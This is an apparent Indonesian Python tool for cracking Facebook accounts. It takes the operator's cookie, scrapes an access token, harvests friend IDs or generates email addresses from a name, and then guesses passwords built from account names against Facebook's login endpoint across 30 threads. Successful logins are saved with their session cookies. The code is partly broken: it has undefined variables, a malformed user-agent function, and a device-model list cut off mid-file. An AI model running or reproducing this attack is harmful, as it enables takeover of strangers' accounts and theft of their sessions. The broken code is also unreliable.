# coding=utf-8

#     *file name: Colmexs
#     *copyright: (C) © 2023 ~ Jessica Putry
#     *contact me on whatsap: +6287799183568
#     *Group Facebok: RATU ERROR (owner)

#--- module in python
import os,sys,requests,re,base64,bs4,datetime,json,time,random,platform,uuid
from time import sleep as jeda
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Romz_Xyz
from datetime import datetime
#from random import randint
ses = requests.Session()

# TANGGAL WAKTU
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 
uasm = []
id,ids=[],[]
ok,cp,loop=0,0,0
akun,method=[],[]

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# WARNA
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
N = '\x1b[1;94m'
U = '\x1b[1;95m'
B = '\x1b[1;96m'
P = '\x1b[1;97m'
C = '\x1b[0m'    
pepek = ['100010061977994','maushamsingh088']


# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.005)

# LOGO
def logo():
	time.sleep (0.01)
	jalan ('\x1b[1;97m⣿⣿⣿⡇⢩⠘⣴⣿⣥⣤⢦⢁⠄⠉⡄⡇⠛⠛⠛⢛⣭⣾⣿⣿⡏')
	jalan ('\x1b[1;97m⣿⣿⣿⡇⠹⢇⡹⣿⣿⣛⣓⣿⡿⠞⠑⣱⠄⢀⣴⣿⣿⣿⣿⡟  💕   💖 💖 💞  ✨')
	jalan ('\x1b[1;97m⣿⣿⣿⣧⣸⡄⣿⣪⡻⣿⠿⠋⠄⠄⣀⣀⢡⣿⣿⣿⣿⡿⠋     💕  ⭐ 💞 ')
	jalan ('\x1b[1;97m⠘⣿⣿⣿⣿⣷⣭⣓⡽⡆⡄⢀⣤⣾⣿⣿⣿⣿⣿⡿⠋      💞 💖 💕   💖')
	jalan ('\x1b[1;97m⠄⢨⡻⡇⣿⢿⣿⣿⣭⡶⣿⣿⣿⣜⢿⡇⡿⠟⠉    ✨     💖   💕  ✨ 💖 💕')
	jalan ('\x1b[1;97m⠄⠸⣷⡅⣫⣾⣿⣿⣿⣷⣙⢿⣿⣿⣷⣦⣚⡀         ⭐     💖   💖')
	jalan ('\x1b[1;97m⠄⠄⢉⣾⡟⠙⠶⠖⠈⢻⣿⣷⣅⢻⣿⣿⣿⣿⣿⣶⣶⡆⠄⣤⡀        💞 ✨ 💕')
	jalan ('\x1b[1;97m⠄⢠⣿⣿⣧⣀⣀⣀⣀⣼⣿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣿⣇⠄⠈⠁      💞  💖      ⭐')
	jalan ('\x1b[1;97m⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣎⢿⣿⣿⣿⣿⣿⣿⣿⣶⣶    ⭐        💖')
	jalan ('\x1b[1;97m⠄⠄⠻⢿⣿⣿⣿⣿⣿⣿⣿⢟⣫⣾⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⡟         💖    💞')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⢮⣭⣍⡭⣭⡵⣾⣿⣿⣿⡎⣿⣿⣌⠻⠿⠿⠿⠟⠋ JANGAN LUPA.....   ✨')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣹⣿⣿⣿⡇⣿⣿⡿ \x1b[1;96m⣾⣿⣿ ⣾⣿⣷ ⣿   ⣿⢿⡿⣿ ⣾⠛⠛ ⢿ ⡿ " ⣾⠛⣷')
	jalan ('\x1b[1;97m⠄⠄⣀⣴⣾⣶⡞⣿⣿⣿⣿⣿⣿⣿⣾⣿⡿⠃ \x1b[1;96m⣿   ⣿ ⣿ ⣿   ⣿⠙⠋⣿ ⣿⣿   ⣿     ⣫')
	jalan ('\x1b[1;97m⣠⣾⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⡟⣹⣿⣳⡄ \x1b[1;96m⢿⣿⣿ ⢿⣿⡿ ⢿⣿⣿ ⣿  ⣿ ⢿⣤⣤ ⣾ ⣷   ⢿⣤⡿')

def banner():                
	os.system('clear')
	print ('')
	print ('')
	print ('')
	jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
	print ('')
	jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
	print (' \033[1;96m  ____________________________________________')
	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')
    
    
def login():
	try:
		ses = requests.Session()
		os.system('clear')
		logo()
		cok = input(f'\n{P} Masukan cookie anda :{B} ')
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok});find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'{P}cookie kamu invalid silahkan menggunakan tumbal/cookies lain.');time.sleep(2);exit()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok});took = re.search('(EAAB\w+)',xz.text).group(1);open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print (f"\n{P} + token:{H} {took}");jeda(2)
				print (f"\n{H} √ login berhasil");jeda(2)
				menu()
	except Exception as e:exit(e)
    
    
# MENU
def menu():
    try:
        token = open(".tok.txt","r").read()
        cok = open(".cok.txt","r").read()    
        try:
            nama = request.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
        except:
            os.system('rm -rf cookie.txt && rm -rf token.txt')
    except (FileNotFoundError,KeyError,IOError):
        print (f"{M} ! cookie invalid");jeda(2);login()
    except requests.exceptions.ConnectionError:
        exit(f"{M} ! tidak ada koneksi")
    banner()
    print("")
    print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mCrack dari  ID publik')
    print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mCrack dari  pencarian nama')
    print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mLihat hasil crack')
    print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mSetting user agent')
    print (' \x1b[1;96m[\x1b[1;97m0\x1b[1;96m] \x1b[1;91mKeluar')
    print()
    mulai = input(" [\x1b[1;97m?] \x1b[1;97mPILIH :\x1b[1;93m ")
    if mulai in "": exit(" Pilih yang Benar")
    elif mulai in "1":idt = input(f"\n{P} Masukan ID : ");dumping(idt,"",{"cookie":cok},token);atur_crack()
    elif mulai in "2":mail_name()
    elif mulai in "3":hasil()
    elif mulai in "4":j()
    elif mulai in "0":
        os.system("rm -rf .tok.txt");os.system("rm -rf .cok.txt");print(f"Sukses hapus Cookies");exit()
    
    
class dumping:
# CRACK PUBLIK
	def __init__(self,idt,fields,cookie,token):
		try:
			headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
			if len(id) == 0:
				params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
			else:
				params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
			url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
			for i in url["friends"]["data"]:
				id.append(i["id"]+"<=>"+i["name"]);print(f' {P}Jumlah  ID{M} :{H} {len(id)} ',end="\r")
			dumping(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
		except:pass
        
  
# CRACK PENCARIAN NAMA
def mail_name():
	try:
		print(f'\n{P} contoh: sayang,pengen,colmeks ')
		nama = input(f' nama orang: ')
		jumlah=int(input(' jumlah ID yang ingin di dump: '))
		if "90000" in str(jumlah):
			jumlah-=1
		if jumlah<90001:
			pass
		else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
		domain = "@gmail.com" #,"@yahoo.com"
		for z in range(int(jumlah)):
			if len(nama.split())>1:mail = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(domain)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
			else:mail = str(nama)+str(z)+str(domain)+"<=>"+str(nama)
			if mail in id:pass
			else:id.append(mail)
			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050);atur_crack()
	except:pass
    

# LIHAT HASIL
oke,cepe=[],[]
def hasil():
	print(f"""
 {P}1. Cek hasil akun {H}Berhasil{P}
 2. Cek hasil akun {K}Checkpoint{P}
 0. Kembali
	""")
	rom = input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
	if rom in['']:
		exit("\n Isi yg benar")
	elif rom in['1','01']: 
		try:
			dirs = os.listdir('OK')
			for file in dirs:
				oke.append(file)
		except:pass 
		if len(oke)==0:
			exit("\n File tidak tersedia")
		else:
			print(f'\n {H}Hasil akun berhasil 👍')
			nomor = 0
			for i in oke:
				fil = open(f"OK/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{P} {i} {P}-{P} {str(len(fil))} ")
			file = input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPilih nomor yang ingin di cek :\x1b[1;93m ")
			try:
				hasil = oke[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n Isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalok = open(f"OK/{hasil}", "r").read().splitlines()
			print(f"\n{P}🍏---------------------------------------🍏")
			print (f"{P} Hasil tanggal: {file_nm} total: {P}{len(totalok)}")
			print(f"{P}🍏---------------------------------------🍏")
			for ngontol in totalok:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;92m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['2','02']: 
		try:
			dirs = os.listdir('CP')
			for file in dirs:
				cepe.append(file)
		except:pass 
		if len(cepe)==0:
			exit(" File tidak tersedia")
		else:
			print(f'\n {K}Hasil akun checkpoint 👎')
			nomor = 0
			for i in cepe:
				fil = open(f"CP/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{P} {i} {P}-{P} {str(len(fil))} ")
			file = input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPilih nomor yang ingin di cek :\x1b[1;93m ")
			try:
				hasil = cepe[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n Isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalcp = open(f"CP/{hasil}", "r").read().splitlines()
			print(f"\n{P}🍊---------------------------------------🍊")
			print (f"{P} Hasil tanggal: {file_nm} total: {K}{len(totalcp)}")
			print(f"{P}🍊---------------------------------------🍊")
			for ngontol in totalcp:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;93m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['0','00']:
		os.system("python simple.py")
	else:
		exit("\n Isi yg benar")    
    
    
    
def atur_crack():
    for ngacak in id:
        ids.insert(0,ngacak)
    print("\n")
    cx=input(f" {P}Gunakan password manual {H}y{P}/{M}t {P}:\x1b[1;93m ")
    print()
    if cx in ('y'):
        manual()
    elif cx in ('t'):    
        print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode B-Graph')
        #print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
        #print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
        #print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
        auto()
        
def manual():
    print (f"{P} Contoh: sayang,anjing,123456")
    pwek=input(" Masukan password: ")
    if pwek in(''):
        exit("\n jangan kosong")
    elif len(pwek)<=5:
        exit("\n password minimal 6 huruf")    
    else:pass    
    print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode B-Graph')
    #print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
    #print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
    #print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
    men=input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
    if men in ["1"," 01"]: method.append("grap")
    print (f"\n\x1b[1;97m⚡ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}⚡\n akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt\n{P}⚡ crack sedang berjalan...\n")
    with Romz_Xyz(max_workers=30) as titid:    
        for akun in id:
            pwx = []
            idz = akun.split('<=>')[0]
            pwx = pwek.split(",")
            #if men in['1']:
                #titid.submit(__romz__, uid, pwx,  "free.facebook.com")
            #elif men in['2']:
                #titid.submit(__romz__, uid, pwx,  "mbasic.facebook.com")
           # elif men in['3']:
               # titid.submit(__romz__, uid, pwx,  "m.facebook.com")
           # elif men in['4']:
               # titid.submit(__romz__, uid, pwx,  "x.facebook.com")
            if 'grap' in method:
                titid.submit(b_graph, idz, pwx)
           # else:
               # exit("\n isi yang benar")    
    print()
    exit(f"{P}CRACK SELESAI\nAkun OK : {H}{ok}\n{P}Akun CP : {K}{cp}")           

def auto():
    print()
    men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
    if men in ["1"," 01"]: method.append("grap")
    print (f"\n{P}⚡ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}\n⚡ akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt\n{P}⚡ crack sedang berjalan... \n")
    with Romz_Xyz(max_workers=30) as titid:
        for akun in id:
            pwx = []
            idz,name = akun.split('<=>')[0],akun.split('<=>')[1].lower()
            na = name.split(' ')[0]
            if len(name)<6:
                if len(na)<3:
                    pass
                else:
                    pwx.append(name)
                    pwx.append(na+'123')
                    pwx.append(na+'12345')
                    pwx.append(na+'1234')    
            else:
                if len(na)<3:
                    pwx.append(name)
                else:
                    pwx.append(name)
                    pwx.append(na+'123')
                    pwx.append(na+'12345')
                    pwx.append(na+'1234')
           # if men in['1']:
                #titid.submit(__romz__, uid, pwx,  "free.facebook.com")
            #elif men in['2']:
               # titid.submit(__romz__, uid, pwx,  "mbasic.facebook.com")
            #elif men in['3']:
               # titid.submit(__romz__, uid, pwx,  "m.facebook.com")
            #elif men in['4']:
                #titid.submit(__romz__, uid, pwx,  "x.facebook.com")
            if 'grap' in method:
                titid.submit(b_graph, idz, pwx)
            #else:
               # exit("\n ! isi yang benar")
    print()
    exit(f"{P}CRACK SELESAI\nAkun OK : {H}{ok}\n{P}Akun CP : {K}{cp}")                          
                
                
  
def b_graph(idz, pwx):       
	global loop,ok,cp
	komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
	print(f"\r{komtol}B-Graph {P}{loop}/{len(id)} - {H}OK:-{ok} {K}CP:-{cp}",flush=True,end=" ")
	ses = requests.Session()
	for pw in pwx:
		try:
			ua = Ua_validate()
			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={idz}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {
			"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
			"uid": idz,
			"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified",
			"flow": "login_no_pin",
			"pass":pw}
			hd = {"Host": "free.prod.facebook.com",
			"content-length": "479",
			"cache-control": "max-age=0",
			"upgrade-insecure-requests": "1",
			"origin": "https://free.prod.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"x-requested-with": "com.opera.mini.native",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "navigate",
			"sec-fetch-user": "?1","sec-fetch-dest": "document",
			"referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={idz}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=hd, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}└──{H} {idz} ◊ {pw} \n{P} └─ {H}{kuki} \n ')
				#print(f"\r{H}{kuki}{N}")
				open('OK/'+okc,'a').write(idz+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print (f'\r{P}└── {K}{idz} ◊ {pw}\n ')
				open('CP/'+cpc,'a').write(idz+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
                
                
def Ua_validate():
      ugen = []
modd = [
    'SM-A015M',
    'SM-A013M',
    'SAMSUNG SM-A105F',
    'SAMSUNG SM-A022F',
    'SM-A025G',
    'SM-A035M',
    'SM-A032M',
    'SM-A037M',
    'SM-A045F',
    'SM-A042F',
    'SM-A047F',
    'SM-A105M',
    'SM-S102DL',
    'SM-A107M',
    'SM-A115AP',
    'SM-A125U',
    'SM-A135F',
    'SM-A136U',
    'SM-A145R',
    'SM-A146U',
    'SM-A205S',
    'SM-A202F',
    'SM-A207F',
    'SM-A215U',
    'SM-A217F',
    'SM-A225M',
    'SM-A226B',
    'SM-A235M',
    'SM-A236U',
    'SM-A245F',
    'SM-A305FN',
    'SM-A307GT',
    'SM-A315F',
    'SM-A325F',
    'SM-A326B',
    'SM-A336E',
    'SM-A346B',
    'SM-A430F',
    'SM-A405FN',
    'SM-E236B',
    'SM-S367VL',
    'SM-J400M',
    'SM-J530F',
    'SM-J530G',
    'SM-J600FN',
    'SM-J610F',
    'SM-S767VL',
    'SM-A202K',
    'SM-M015G',
    'SM-M017F',
    'SM-M127F',
    'Galaxy Note20',
    'SM-N950U',
    'SM-N9300',
    'SM-N960F',
    'SM-9005',
    'SM-N981B',
    'SM-N985F',
    'SM-N770F',
    'SM-N970F',
    'CPH2249',
    'CPH2247',
    'CPH1114',
    'CPH1235',
    'CPH2048',
    'CPH2107',
    'CPH2261',
    'CPH2331',
    'CPH2351',
    'CPH2389',
    'CPH2451',
    'CPH2491',
    'CPH2499',
    'CPH2513',
    'CPH2515',
    'CPH2519',
    'CPH2521',
    'CPH2523',
    'CPH2525',
    'CPH2529',
    'CPH2551',
    'CPH2553',
    'CPH2569',
    'CPH2579',
    'CPH2591',
    'CPH2643',
    'CPH6528',
    'CPH7338',
    'CPH2179',
    'CPH2269',
    'CPH2083',
    'CPH2271',
    'CPH2471',
    'CPH1923',
    'CPH1925',
    'CPH2137',
    'Infinix X682B',
    'Infinix X688B',
    'InfinixX689',
    'Infinix X689D',
    'Infinix X662',
    'Infinix X6812',
    'Infinix X6817',
    'Infinix X6816C',
    'Infinix X6816D',
    'Infinix X6826B',
    'Infinix X666B',
    'Infinix X6825',
    'Infinix X6827',
    'Infinix X6833B',
    'Infinix X6835',
    'Infinix X625C',
    'Infinix X650C',
    'Infinix X655D',
    'Infinix X680B',
    'Infinix X693',
    'Infinix X695C',
    'Infinix X663',
    'Infinix X697',
    'Infinix X698',
    'Infinix X670',
    'Infinix X663D',
    'Infinix X676B',
    'Infinix X671B',
    'Infinix X672',
    'Infinix X6819',
    'Infinix X677',
    'Infinix X678B',
    'Infinix X6710',
    'Infinix X6716B',
    'Infinix X652A',
    'Infinix X660B',
    'Infinix X5515F',
    'Infinix X5516C',
    'Infinix X653',
    'Infinix X680D',
    'Infinix X657C',
    'Infinix X6512',
    'Infinix X6823C',
    'Infinix X6517',
    'Infinix X6516',
    'Infinix X6711',
    'Infinix X6821',
    'Infinix X6815D',
    'Infinix X6820',
    'Infinix X6811',
    'Infinix Zero 20',
'Infinix Zero X',
'Infinix Note 12',
'Infinix Note 11',
'Infinix Note 10 Pro',
'Infinix Hot 12',
'Infinix Hot 11S',
'Infinix Hot 11',
'Infinix Hot 10',
'Infinix Hot 10i',
'Infinix Smart 5',
'Infinix S5 Pro',
'Infinix S4',
'Infinix Note 10',
'Infinix Note 8i',
'Infinix Note 8',
'Infinix Hot 9',
'Infinix Hot 10 Play',
'Infinix Smart 6',
'Infinix Note 5',
'Infinix Zero 8',
'Infinix Note 4',
'Infinix Hot 3',
'Infinix S3',
'Infinix Hot 5',
'Infinix Note 6',
'Infinix Note 7',
'Infinix Zero 6',
'Infinix Hot 7',
'Infinix Zero 5',
'Infinix S2',
'Infinix Note 3',
'Infinix Hot 2',
'Infinix Hot 3 Pro',
'Infinix Hot 8',
'Infinix S5',
'V2055A',
'V2458A',
'V2359A',
'V2329A',
'V2217A',
'V2408A',
'PA2353',
'V2338A',
'V2419A',
'V2338A',
'V2238A',
'V2339FA',
'V2148A',
'V2307A',
'V2338A',
'V2270A',
'V2254A',
'V2220A',
'V2338A',
'V2415A',
'V2354A',
'V2303A',
'V2403A',
'V1922A',
'V2417A',
'V2403A',
'V2405A',
'V1936AL',
'V2143A',
'V2324A',
'V2301A',
'V2243A',
'PA2353',
'V2338A',
'V2307A',
'V2271A',
'V2429A',
'V2232A',
'PA2473',
'V1981A',
'V2309A',
    'vivo 1817',
    'vivo 1917',
    'vivo 1915',
    'vivo 1911',
    'vivo 1933',
    'vivo 1912',
    'vivo 1920',
    'vivo 1921',
    'vivo 1910',
    'vivo 1927',
    'vivo 1913',
    'vivo 1923',
    'vivo 1926',
    'vivo 1928',
    'vivo 1931',
    'vivo 1935',
    'RMX3516',
    'RMX3371',
    'RMX3461',
    'RMX3286',
    'RMX3561',
    'RMX3388',
    'RMX3311',
    'RMX3142',
    'RMX2071',
    'RMX1805',
    'RMX1809',
    'RMX1801',
    'RMX1807',
    'RMX1803',
    'RMX1825',
    'RMX1821',
    'RMX1822',
    'RMX1833',
    'RMX1851',
    'RMX1853',
    'RMX1827',
    'RMX1911',
    'RMX1919',
    'RMX1927',
    'RMX1971',
    'RMX1973',
    'RMX2030',
    'RMX2032',
    'RMX1925',
    'RMX1929',
    'RMX2001',
    'RMX2061',
    'RMX2063',
    'RMX2040',
    'RMX2042',
    'RMX2002',
    'RMX2151',
    'RMX2163',
    'RMX2155',
    'RMX2170',
    'RMX2103',
    'RMX3085',
    'RMX3241',
    'RMX3081',
    'RMX3151',
    'RMX3381',
    'RMX3521',
    'RMX3474',
    'RMX3471',
    'RMX3472',
    'RMX3392',
    'RMX3393',
    'RMX3491',
    'RMX1811',
    'RMX2185',
    'RMX3231',
    'RMX2189',
    'RMX2180',
    'RMX2195',
    'RMX2101',
    'RMX1941',
    'RMX1945',
    'RMX3063',
    'RMX3061',
    'RMX3201',
    'RMX3203',
    'RMX3261',
    'RMX3263',
    'RMX3193',
    'RMX3191',
    'RMX3195',
    'RMX3197',
    'RMX3265',
    'RMX3268',
    'RMX3269',
    'RMX2027', 
    'RMX2020',
    'RMX2021',
    'RMX3581',
    'RMX3501',
    'RMX3503',
    'RMX3511',
    'RMX3310',
    'RMX3312',
    'RMX3551',
    'RMX3301',
    'RMX3300',
    'RMX2202',
    'RMX3363',
    'RMX3360',
    'RMX3366',
    'RMX3361',
    'RMX3031',
    'RMX3370',
    'RMX3357',
    'RMX3560',
    'RMX3562',
    'RMX3350',
    'RMX2193',
    'RMX2161',
    'RMX2050',
    'RMX2156',
    'RMX3242',
    'RMX3171',
    'RMX3430',
    'RMX3235',
    'RMX3506',
    'RMX2117',
    'RMX2173',
    'RMX3161',
    'RMX2205',
    'RMX3462',
    'RMX3478',
    'RMX3372',
    'RMX3574',
    'RMX1831',
    'RMX3121',
    'RMX3122',
    'RMX3125',
    'RMX3043',
    'RMX3042',
    'RMX3041',
    'RMX3092',
    'RMX3093',
    'RMX3571',
    'RMX3475',
    'RMX2200',
    'RMX2201',
    'RMX2111',
    'RMX2112',
    'RMX1901',
    'RMX1903',
    'RMX1992',
    'RMX1993',
    'RMX1991',
    'RMX1931',
    'RMX2142',
    'RMX2081',
    'RMX2085',
    'RMX2083',
    'RMX2086',
    'RMX2144',
    'RMX2051',
    'RMX2025',
    'RMX2075',
    'RMX2076',
    'RMX2072',
    'RMX2052',
    'RMX2176',
    'RMX2121',
    'RMX3115',
    'RMX1921',
    'M2004J19PI MIUI',
     'Xiaomi 12T',
    'Xiaomi 12S Ultra',
    'Xiaomi 12S Ultra',
    'Xiaomi 12SE Ultra',
    'Xiaomi 11 Lite 5G NE',
    'Xiaomi 12 Lite',
    'Mi 10 Lite 5G',
    'Mi 11 Lite 5G',
    'Mi 12 Lite 5G',
    'Mi 10 Lite 4G',
    'Mi 10 Lite 4G',
    'Mi 11 Lite 5G  stable',
    'Mi 10T Pro',
    'Mi 11 Lite',
    'MI 8 Lite',
    'MI 5X MIUI',
    'Mi 11i',
    'Mi 9T Pro',
    'MIX 4',
    'Mi Note 10',
    'Mi 9 SE',
    'Mi 8 SE',
    'Mi 10 SE',
    'MI MAX 3',
    'XMIX 2S',
    'MI 8 SE',
    'Mi A3',
    'Mi A4',
    'MI 6',
    'MI MAX 2',
    'MI MAX 3',
    'Mi 12i',
    'Redmi Note 4',
    'Redmi 9T',
    'Redmi Note 7 Pro',
    'Redmi K20 Pro',
    'Redmi Note 11',
    'Redmi Note 13',
    'Redmi Note 7S',
    'Redmi Note 8',
    'Redmi Note 8 Pro',
    'Redmi Note 9',
    'Redmi Note 9 Pro',
    'Redmi Y2',
    'Redmi Y3',
    'Redmi 01A',
